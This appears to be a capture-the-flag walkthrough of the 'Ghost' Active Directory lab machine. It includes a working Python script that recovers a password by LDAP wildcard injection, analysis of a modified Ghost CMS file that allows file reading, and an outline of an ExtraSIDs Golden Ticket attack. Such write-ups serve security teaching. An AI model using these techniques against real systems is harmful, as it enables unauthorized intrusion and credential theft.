Summary
#

Ghost is an Insane Windows Active Directory machine that demonstrates the exploitation of multiple technologies across a multi-domain forest. The attack chain begins with an LDAP injection vulnerability to recover Gitea credentials, followed by source code analysis to exploit arbitrary file read and remote code execution vulnerabilities on a Linux host. Access to Active Directory is achieved by extracting a Kerberos ticket, enabling DNS manipulation to capture another user’s NTLM hash. The compromise continues by abusing Group Managed Service Accounts (gMSAs) to recover an AD FS service account password, which is then used to forge a Golden SAML assertion and access a database management application. Finally, abuse of linked MSSQL servers, privilege escalation, and the parent-child trust relationship culminate in an ExtraSIDs Golden Ticket attack, resulting in the complete compromise of the Active Directory forest.

From the output, we identified a subdomain intranet which we can add to our /etc/hosts file. Visiting the subdomain shows another login page asking for username and a secret

After trying to login with arbitrary username and secret, we see an HTTP request passing as POST in the multipart form data format.

The username and secret values are named as 1_ldap-username and 1_ldap-secret. The mentioning of LDAP suggests that the website maybe using LDAP authentication and the login form can be vulnerable to LDAP injection attacks. If the login form is vulnerable, we can log in to the site by using * in both username and secret fields. In LDAP, * is used as a wildcard which means to match everything. If in the backend the website is using simple vulnerable LDAP query like:

(&(username=)(secret=))

Passing * in both fields results in (&(username=*)(secret=*)) which evaluates to true and will login us using the first matched account in the list.

Now to work towards finding the password of gitea_temp_principal, we can again use the login form but this time we need to enumerate the account’s password letter by letter using wildcard injection. As the website throws error but shows a 200 code when the login is unsuccessfull and shows 303 code with token cookie in response when the login is successfull, we can use the following python script which enumerates the password using this difference in the responses:

#!/usr/bin/env python3

import json
import re
import string
import requests

BASE_URL = "http://intranet.ghost.htb:8008/login"

# Character set to brute-force
CHARSET = string.ascii_letters + string.digits


def fetch_action_data(session):
    """Retrieve the dynamic values required for the POST request."""

    page = session.get(BASE_URL).text

    action_json = re.search(
        r'name="\$ACTION_1:0"\s+value="([^"]+)"',
        page
    ).group(1).replace("&quot;", '"')

    action_key = re.search(
        r'name="\$ACTION_KEY"\s+value="([^"]+)"',
        page
    ).group(1)

    next_action = json.loads(action_json)["id"]

    return action_json, action_key, next_action


def recover_password():

    session = requests.Session()

    action_json, action_key, next_action = fetch_action_data(session)

    headers = {
        "Next-Action": next_action
    }

    password = ""
    attempts = 1

    while True:

        found = False

        for ch in CHARSET:

            candidate = password + ch + "*"

            print(
                f"\r[{attempts:04d}] Current: '{password}' | Testing: '{candidate}'",
                end="",
                flush=True
            )

            attempts += 1

            data = {
                "1_$ACTION_REF_1": "",
                "1_$ACTION_1:0": action_json,
                "1_$ACTION_1:1": "[{}]",
                "1_$ACTION_KEY": action_key,
                "1_ldap-username": "gitea_temp_principal",
                "1_ldap-secret": candidate,
                "0": '[{},"$K1"]'
            }

            response = session.post(
                BASE_URL,
                headers=headers,
                data=data,
                allow_redirects=False
            )

            if response.status_code == 303:
                password += ch
                print(f"\r[+] Found prefix: {password}{' ' * 40}")
                found = True
                break

        if not found:
            break

    print(f"\n\n[+] Recovered password: {password}")


if __name__ == "__main__":
    recover_password()

Source Code Analysis
#

After the login to the site, we can see two private repositories.

Opening the ghost-dev / blog repo shows the following page

The repo’s README.md tells that the blog uses Ghost CMS in a Docker container. They have modified some Ghost CMS’ source code to add new features to the site and the code is written in the custom coded posts-public.js file. There is also mentioned that blog and intranet are being integrated so that intranet can feature some posts from blog and scan its URLs. But as the functionality is still in development, they had locked them behind an API key named DEV_INTRANET_KEY which is said to be set as the environment variable. We are provided with a public API key of Ghost as a5af628828958c976a3b6cc81a.

As the code in posts-public.js is custom coded, we can compare it with the official code file of Ghost CMS. To find the exact version of the current Ghost CMS website at http://ghost.htb:8008/, we can use the methods discussed in the article here.

Using the 3rd method, we find the version as 5.78

We can download the version 5.78 source code files from the official GitHub repo at link and then compare the original posts-public.js and the custom coded posts-public.js from the Gitea repo.

Comparing the modified file against the original reveals that the query() function has been changed to an asynchronous function and now accepts an additional extra query parameter. If this parameter is supplied, the application attempts to read a file from the /var/lib/ghost/extra/ directory and embeds its contents into the API response under the meta.extra field. This custom functionality introduces a file-reading capability that was not present in the original implementation, making it a promising area to investigate for potential Local File Inclusion (LFI) vulnerabilities.

ExtraSIDs Golden Ticket Attack
#

As we are in the PRIMARY host which is the DC of the child domain corp.ghost.htb, we can perform ExtraSIDs attack against the target to compromise the parent domain from the child domain. BloodHound reveals a bidirectional trust relationship between the child and parent domains. Because of this trust, a forged Golden Ticket for the child domain can include the Enterprise Admins SID of the parent domain as an ExtraSID. When the ticket is presented to services in the parent domain, the parent domain honors the Enterprise Admins SID, granting administrative access.

To perform the ExtraSids attack, the attacker needs:

  • KRBTGT hash of the child domain
  • SID of the child domain
  • Username in the child domain
  • FQDN of the child domain
  • SID of Enterprise Admins group in the parent domain
